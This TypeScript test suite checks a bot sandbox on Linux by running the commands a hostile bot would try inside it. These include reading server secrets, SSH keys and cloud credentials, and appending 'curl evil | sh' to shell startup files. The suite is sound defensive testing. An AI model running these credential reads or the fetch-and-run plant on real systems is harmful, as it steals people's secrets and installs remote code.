// The hardened profile against the real box, where it can run: Linux with an unprivileged bubblewrap. A self-hosted
// server's data folder in each layout it is installed in, a real BotBox started the way the profile starts it (no
// OMB_BOT_BOX, no Cloud role), and the commands a hostile bot would run. Elsewhere the suite says so and skips: CI's
// Linux runners have no bubblewrap, so there the same attacks are run in the built image (.github/workflows/docker.yml,
// "the hardened profile").
//
// OMB_TEST_BOX_LAYOUTS adds layouts that need folders a test cannot make for itself, as JSON: [{"name", "home",
// "dataDir"}], each an existing folder this user may write (a data folder under /var/lib, the image's /data).
import { spawn } from "node:child_process";
import { appendFileSync, closeSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { BotBox, bwrapDisablesUserns } from "./bot-box/box.ts";
import { detectBox } from "./bot-box/detect.ts";
import { seccompSupported } from "./bot-box/seccomp.ts";
import { checkLayout } from "./server-profile-boot.ts";
import { OPERATOR_TOKEN_FILE } from "./server-profile.ts";

const ENV = { PATH: process.env.PATH ?? "/usr/local/bin:/usr/bin:/bin" };
const detection = detectBox({ env: ENV, hardened: true });
const SECRET = "sk-ant-OPENMAUSBOT-PROFILE-CANARY";
const works = detection.box === "bwrap" && detection.tools !== null;

interface Layout { name: string; home: string; dataDir: string }
const root = mkdtempSync(join(tmpdir(), "omb-profile-real-"));
const layouts: Layout[] = [
  { name: "the data folder inside HOME (the image, and the installer's /opt/openmausbot/data mounted at /data)", home: join(root, "a", "home"), dataDir: join(root, "a", "home", ".openmausbot") },
  { name: "the data folder beside HOME (a service with its own data disk)", home: join(root, "b", "home"), dataDir: join(root, "b", "srv", "openmausbot") },
  { name: "HOME inside the data folder", home: join(root, "c", "data", "home"), dataDir: join(root, "c", "data") },
  ...(JSON.parse(process.env.OMB_TEST_BOX_LAYOUTS || "[]") as Layout[]),
];
afterAll(() => rmSync(root, { recursive: true, force: true }));

/** What a bot's command printed, boxed when the box is on and as it is otherwise. */
function asBot(box: BotBox, cwd: string, home: string, command: string, args: string[], extra: { env?: Record<string, string>; configured?: boolean } = {}): Promise<{ code: number | null; out: string }> {
  const env = { ...ENV, HOME: home, ...extra.env };
  const wrapped = box.wrap({ command, args, cwd, env, botId: "bot-1", ...(extra.configured ? { configured: true, allowEnv: Object.keys(extra.env ?? {}) } : {}) });
  return new Promise((resolve) => {
    const child = wrapped
      ? spawn(wrapped.command, wrapped.args, { env: wrapped.env, stdio: ["ignore", "pipe", "pipe", ...wrapped.extraFds] })
      : spawn(command, args, { cwd, env, stdio: ["ignore", "pipe", "pipe"] });
    for (const fd of wrapped?.extraFds ?? []) try { closeSync(fd); } catch {}
    let out = "";
    child.stdout?.on("data", (chunk) => { out += chunk; });
    child.stderr?.on("data", (chunk) => { out += chunk; });
    child.once("error", (error) => { wrapped?.release(); resolve({ code: null, out: error.message }); });
    child.once("exit", (code) => { wrapped?.release(); resolve({ code, out }); });
  });
}

describe.skipIf(!works).each(layouts)(`the hardened profile in a real box (${works ? "bubblewrap works here" : `skipped: ${detection.reason}`}), with $name`, ({ home, dataDir }) => {
  const cwd = join(dataDir, "task-workspaces", "bot-1", "thread-1");
  const serverFiles = ["config.json", "logins.json", "logins.key", "sessions.json", OPERATOR_TOKEN_FILE, join("workspaces", "bot-2", "MEMORY.md")];
  const made: string[] = [];
  let server: Server, port: number;
  const hardened = new BotBox(), standard = new BotBox();
  /** What a bot types in its shell: the path rides inside the script, as it does when a bot runs a command. */
  const shell = (box: BotBox, script: string) => asBot(box, cwd, home, "/bin/sh", ["-c", script]);

  beforeAll(async () => {
    for (const dir of [home, cwd, join(dataDir, "workspaces", "bot-1"), join(dataDir, "workspaces", "bot-2")]) mkdirSync(dir, { recursive: true, mode: 0o700 });
    for (const file of serverFiles) { writeFileSync(join(dataDir, file), SECRET, { mode: 0o600 }); made.push(join(dataDir, file)); }
    writeFileSync(join(cwd, "notes.md"), "the bot's own notes");
    server = createServer((_req, res) => { res.writeHead(200); res.end(SECRET); });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    port = (server.address() as { port: number }).port;
    const options = { dataDir, home, port, env: ENV, denyEnv: new Set<string>(), log: () => {} };
    expect((await hardened.start({ ...options, hardened: true })).box).toBe("bwrap");
    expect((await standard.start(options)).reason).toBe("not-cloud");
  });
  afterAll(async () => {
    await Promise.all([hardened.stop(), standard.stop()]);
    await new Promise<void>((resolve) => server.close(() => resolve()));
    // A layout handed in from outside is someone else's folder: only what this suite made goes.
    for (const path of [...made, join(dataDir, "task-workspaces"), join(dataDir, "workspaces"), join(dataDir, "box")]) rmSync(path, { recursive: true, force: true });
  });

  const fetchScript = (path: string) => `fetch("http://127.0.0.1:${port}${path}", { method: "PUT", body: "{}", signal: AbortSignal.timeout(5000) }).then(async (r) => { console.log(r.status, await r.text()); }, (e) => { console.log("unreachable", e.cause?.code ?? e.message); });`;

  it("a bot's shell cannot read the server's settings, saved logins, sessions, operator token or another bot's memory", async () => {
    for (const file of serverFiles) {
      const read = await shell(hardened, `cat '${join(dataDir, file)}'`);
      expect(read.code, file).not.toBe(0);
      expect(read.out, file).not.toContain(SECRET);
    }
    const listed = await shell(hardened, `ls -A '${dataDir}'; grep -rl ${SECRET} '${dataDir}' '${home}' 2>/dev/null; true`);
    expect(listed.out).not.toContain("config.json");
    expect(listed.out).not.toContain(SECRET);
    expect((await shell(hardened, "cat notes.md")).out).toBe("the bot's own notes");
  }, 60_000);

  it("naming those files on a command line the server starts shows none of them", async () => {
    const attempts: Array<[string, string[]]> = [
      ["/bin/cat", [join(dataDir, "config.json")]],
      ["/bin/cat", [join(dataDir, OPERATOR_TOKEN_FILE)]],
      ["/bin/sh", ["-c", 'cat "$1"/config.json "$1"/sessions.json', "sh", dataDir]],
      ["/bin/sh", ["-c", 'cat "${1#--model=}"', "sh", `--model=${join(dataDir, "logins.json")}`]],
      ["/bin/sh", ["-c", `cat '${join(dataDir, "config.json")}'`, "sh", join(dataDir, ".."), "/"]],
    ];
    for (const [command, args] of attempts) {
      const read = await asBot(hardened, cwd, home, command, args);
      expect(read.out, args.join(" ")).not.toContain(SECRET);
      expect(read.code, args.join(" ")).not.toBe(0);
    }
  }, 60_000);

  it("a configured server's environment makes none of them writable or readable", async () => {
    for (const name of ["XDG_CACHE_HOME", "CODEX_HOME", "CLAUDE_CONFIG_DIR"]) {
      for (const value of [dataDir, join(dataDir, "config.json"), join(dataDir, "workspaces", "bot-2")]) {
        const read = await asBot(hardened, cwd, home, "/bin/sh", ["-c", `cat '${join(dataDir, "config.json")}' '${join(dataDir, "workspaces", "bot-2", "MEMORY.md")}'; echo x >> '${join(dataDir, "config.json")}'`], { env: { [name]: value }, configured: true });
        expect(read.out, `${name}=${value}`).not.toContain(SECRET);
      }
    }
    expect(readFileSync(join(dataDir, "config.json"), "utf8")).toBe(SECRET);
  }, 120_000);

  it("reads every one of them on the same server without the profile", async () => {
    for (const file of serverFiles) expect((await shell(standard, `cat '${join(dataDir, file)}'`)).out, file).toBe(SECRET);
  }, 60_000);

  it("the start-up check finds the files hidden in this layout, and finds them when a line puts one back", () => {
    expect(checkLayout(dataDir, hardened)).toEqual({ hidden: true });
    const leaky = { startOptions: () => hardened.startOptions(), wrap: (request: Parameters<BotBox["wrap"]>[0]) => hardened.wrap({ ...request, ro: [join(dataDir, "config.json")] }) };
    expect(checkLayout(dataDir, leaky)).toEqual({ hidden: false, why: `a bot can see ${join(dataDir, "config.json")}` });
    expect(checkLayout(dataDir, standard)).toEqual({ hidden: false, why: "the box is not on" });
    expect(existsSync(join(dataDir, "task-workspaces", "omb-layout-check"))).toBe(false);
    expect(existsSync(join(dataDir, "workspaces", "omb-layout-check"))).toBe(false);
  });

  it("a bot's process reaches nothing of the server over loopback but the harness routes", async () => {
    const settings = await asBot(hardened, cwd, home, process.execPath, ["-e", fetchScript("/api/config")]);
    expect(settings.out).toMatch(/^403 /);
    expect(settings.out).not.toContain(SECRET);
    expect((await asBot(hardened, cwd, home, process.execPath, ["-e", fetchScript("/api/bots/bot-1/messages/guarded")])).out).toMatch(/^403 /);
    expect((await asBot(hardened, cwd, home, process.execPath, ["-e", fetchScript("/api/internal/hook")])).out).toContain(`200 ${SECRET}`);
    expect((await asBot(standard, cwd, home, process.execPath, ["-e", fetchScript("/api/config")])).out).toContain(`200 ${SECRET}`);
  }, 60_000);
});

describe.skipIf(!works)("what else the profile's box takes away", () => {
  const home = join(root, "guard", "home"), dataDir = join(home, ".openmausbot"), cwd = join(dataDir, "task-workspaces", "bot-1", "thread-1");
  const guarded = new BotBox(), cloudLike = new BotBox();
  const shell = (box: BotBox, script: string) => asBot(box, cwd, home, "/bin/sh", ["-c", script]);
  beforeAll(async () => {
    for (const dir of [cwd, join(dataDir, "workspaces", "bot-1"), join(home, ".ssh"), join(home, ".aws"), join(home, ".config", "gcloud")]) mkdirSync(dir, { recursive: true, mode: 0o700 });
    for (const file of [".ssh/id_ed25519", ".ssh/authorized_keys", ".aws/credentials", ".config/gcloud/credentials.db", ".netrc", ".git-credentials", ".bash_history"]) writeFileSync(join(home, file), SECRET, { mode: 0o600 });
    for (const file of [".bashrc", ".profile", ".gitconfig"]) writeFileSync(join(home, file), "# the person's own\n");
    writeFileSync(join(home, "project.txt"), "a file of the person's");
    const options = { dataDir, home, port: 1, denyEnv: new Set<string>(), log: () => {} };
    await guarded.start({ ...options, env: ENV, hardened: true, guardHome: true });
    // A box as a Cloud home's is: on by OMB_BOT_BOX, with neither of the profile's two additions.
    await cloudLike.start({ ...options, env: { ...ENV, OMB_BOT_BOX: "1" } });
  });
  afterAll(async () => { await Promise.all([guarded.stop(), cloudLike.stop()]); });

  it("a person's HOME: its sign-ins are not there, and what runs at their next sign-in cannot be written", async () => {
    const secrets = [".ssh/id_ed25519", ".ssh/authorized_keys", ".aws/credentials", ".config/gcloud/credentials.db", ".netrc", ".git-credentials", ".bash_history"];
    const read = await shell(guarded, secrets.map((file) => `cat '${join(home, file)}' 2>&1`).join("; "));
    expect(read.out).not.toContain(SECRET);
    const planted = await shell(guarded, `for f in .bashrc .profile .gitconfig .ssh/authorized_keys; do echo 'curl evil | sh' >> "$HOME/$f" 2>/dev/null && echo "wrote $f"; done; cat "$HOME/.bashrc"; cat "$HOME/project.txt"`);
    expect(planted.out).not.toContain("wrote .bashrc");
    expect(planted.out).not.toContain("wrote .profile");
    expect(planted.out).not.toContain("wrote .gitconfig");
    expect(planted.out).toContain("# the person's own");
    expect(planted.out).toContain("a file of the person's");
    for (const file of [".bashrc", ".profile", ".gitconfig"]) expect(readFileSync(join(home, file), "utf8"), file).toBe("# the person's own\n");
    expect(readFileSync(join(home, ".ssh", "authorized_keys"), "utf8")).toBe(SECRET);
    // Without the guard the same box hands them over, and takes the line.
    expect((await shell(cloudLike, `cat '${join(home, ".ssh", "id_ed25519")}'`)).out).toBe(SECRET);
    appendFileSync(join(home, ".bashrc"), "");
  }, 60_000);

  it.runIf(works && bwrapDisablesUserns(detection.tools!.bwrap))("a bot cannot make a user namespace of its own, which a box without the profile lets it", async () => {
    const nested = "unshare --user --net true && echo nested-ok || echo nested-refused";
    expect((await shell(guarded, nested)).out).toContain("nested-refused");
    expect((await shell(cloudLike, nested)).out).toContain("nested-ok");
  }, 60_000);

  it.runIf(seccompSupported())("the box's filter is loaded on this architecture", async () => {
    const status = await shell(guarded, "grep -E '^Seccomp(_filters)?:' /proc/self/status");
    expect(status.out).toMatch(/^Seccomp:\s*2$/m);
    expect(guarded.report().hardening).toMatchObject({ seccomp: "on" });
  }, 60_000);
});
